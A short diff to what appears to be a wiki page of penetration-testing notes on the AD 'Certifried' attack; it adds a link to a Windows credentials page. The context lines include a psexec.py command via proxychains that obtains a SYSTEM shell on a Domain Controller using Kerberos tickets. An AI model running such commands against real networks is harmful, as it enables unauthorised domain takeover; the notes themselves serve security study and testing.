@@ -208,6 +208,10 @@ Even juicier, let's obtain a shell as **SYSTEM** on the Domain Controller using
 proxychains python /usr/share/doc/python3-impacket/examples/psexec.py "${DOMAIN}/Administrator@${DC_COMPUTERNAME}.${DOMAIN}" -k -no-pass -dc-ip ${DC_IPADDR} -target-ip ${DC_IPADDR}
 ```
 
+## Related pages
+
+- [[windows-credentials|Windows credentials]]
+
 ## References
 
 - [AD Certifried](https://cravaterouge.com/articles/ad-certifried/)
